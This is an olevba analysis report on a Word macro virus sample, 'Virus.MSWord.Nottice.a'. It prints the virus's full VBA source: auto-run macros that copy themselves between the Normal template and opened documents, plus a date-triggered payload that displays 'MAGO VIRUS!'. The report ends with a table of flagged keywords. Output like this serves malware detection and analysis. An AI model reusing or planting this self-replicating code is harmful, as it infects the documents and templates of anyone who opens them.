olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nottice.a-13eef95c3de0b605db79297e10ba15b40549871e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nottice.a-13eef95c3de0b605db79297e10ba15b40549871e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Nottice.a-13eef95c3de0b605db79297e10ba15b40549871e - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim J$
On Error GoTo -1: On Error GoTo Finish
WordBasic.DisableAutoMacros 0
J$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If J$ = "normal.dot" Then
    If VI = 1 Then
        GoTo Finish
    Else
        InfectaDOC
    End If
Else
    If VI2 = 1 Then
        GoTo Finish
    Else
        InfectaGlobal
    End If
End If
Finish:
WordBasic.Call "MAGIA"
End Sub

Private Function VI()
Dim i
VI = 0
If WordBasic.CountMacros(1) > 0 Then
    For i = 1 To WordBasic.CountMacros(1)
                If WordBasic.[MacroName$](i, 1) = "MAGIA" Then
                             VI = 1
        End If
    Next i
End If
End Function

Private Function VI2()
Dim i
VI2 = 0
If WordBasic.CountMacros(0) > 0 Then
    For i = 1 To WordBasic.CountMacros(0)
                If WordBasic.[MacroName$](i, 0) = "MAGIA" Then
                             VI2 = 1
        End If
    Next i
End If
End Function

Private Sub InfectaDOC()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:MAGIA", WordBasic.[FileName$]() + ":MAGIA"
WordBasic.FileSaveAll 1, 1
End Sub

Private Sub InfectaGlobal()
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":MAGIA", "Global:MAGIA"
WordBasic.FileSaveAll 1, 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO MAGIA.bas 
in file: Virus.MSWord.Nottice.a-13eef95c3de0b605db79297e10ba15b40549871e - OLE stream: 'Macros/VBA/MAGIA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.MAGIA.MAIN"
If WordBasic.Day(WordBasic.Now()) = 19 Then
    WordBasic.FileNew
    WordBasic.ToggleFull
    WordBasic.DocMaximize
    WordBasic.Font "Imprint MT Shadow"
    WordBasic.FontSize 30
    WordBasic.Bold
    WordBasic.Insert "MAGO VIRUS!"
    WordBasic.FontSize 18
    WordBasic.Insert " CHACLACAYO PERU 98"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

